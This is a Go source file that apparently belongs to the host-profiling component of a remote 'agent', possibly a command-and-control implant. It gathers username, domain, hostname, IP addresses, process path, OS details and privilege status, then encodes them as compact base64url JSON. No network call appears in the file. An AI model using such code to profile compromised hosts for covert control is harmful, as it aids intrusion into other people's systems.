package metadata

import (
	"agent/internal/logger"
	"encoding/base64"
	"encoding/json"
	"net"
	"os"
	"os/user"
	"strings"
)

type Metadata struct {
	Username string   `json:"u,omitempty"`
	Hostname string   `json:"h,omitempty"`
	Domain   string   `json:"d,omitempty"`
	IPs      []string `json:"i,omitempty"`
	OSMeta   string   `json:"om,omitempty"`
	ProcName string   `json:"pn,omitempty"`
	IsPriv   bool     `json:"ip,omitempty"`
	Extra    string   `json:"e,omitempty"`
}

func GetMetadata() string {
	lg := logger.GetLogger()
	lg.Info("Collecting metadata")

	metadata := &Metadata{
		Hostname: getHostname(),
		IPs:      getIPs(),
		OSMeta:   getOSMeta(),
		ProcName: getProcName(),
		IsPriv:   isPrivileged(),
	}
	metadata.Domain, metadata.Username = getUsername()

	lg.Info("Hostname: %s", metadata.Hostname)
	if metadata.Domain != "" {
		lg.Info("Domain: %s", metadata.Domain)
	}
	lg.Info("Username: %s", metadata.Username)
	lg.Info("OS: %s", metadata.OSMeta)
	lg.Info("Process name: %s", metadata.ProcName)
	lg.Info("Is priveleged: %t", metadata.IsPriv)
	lg.Info("Extra: %s", metadata.Extra)

	jsonMeta, err := json.Marshal(metadata)
	if err != nil {
		lg.Fatal("Failed to convert metadata to JSON: %w", err)
	}
	encodedMetadata := base64.RawURLEncoding.EncodeToString(jsonMeta)

	return encodedMetadata
}

func getUsername() (domain string, username string) {
	u, err := user.Current()
	if err != nil {
		return "", "<unknown>"
	}

	split := strings.SplitN(u.Username, "\\", 2)
	if len(split) > 1 {
		domain = split[0]
		username = split[1]
	} else {
		username = u.Username
	}

	return domain, username
}

func getHostname() string {
	hostname, err := os.Hostname()
	if err != nil {
		return "<unknown>"
	}
	return hostname
}

func getProcName() string {
	proc, err := os.Executable()
	if err != nil {
		return "<unknown>"
	}
	return proc
}

func getIPs() []string {
	interfaces, err := net.InterfaceAddrs()
	if err != nil {
		return []string{}
	}

	var ips []string
	for _, iface := range interfaces {
		if ipnet, ok := iface.(*net.IPNet); ok && !ipnet.IP.IsLoopback() {
			if ipnet.IP.To4() != nil {
				ips = append(ips, ipnet.String())
			}
		}
	}

	return ips
}
